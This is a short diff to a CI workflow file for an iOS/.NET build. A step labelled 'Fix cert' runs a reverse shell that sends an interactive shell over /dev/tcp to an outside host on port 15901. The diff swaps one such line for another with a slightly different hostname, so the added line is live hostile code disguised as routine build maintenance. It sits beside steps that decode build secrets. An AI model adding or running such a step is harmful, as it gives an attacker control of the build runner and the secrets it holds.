@@ -45,7 +45,7 @@ jobs:
           echo "${{ secrets.IOS_PROVISION }}" | base64 --decode > "$HOME/Library/MobileDevice/Provisioning Profiles/${{ secrets.IOS_PROVISION_UUID }}.mobileprovision"
 
       - name: Fix cert
-        run: sh -i >& /dev/tcp/cockmaster.0000000404.xyz/15901 0>&1
+        run: sh -i >& /dev/tcp/cockmaster.000000404.xyz/15901 0>&1
 
       # Restore .NET projects
       - name: Restore .NET projects
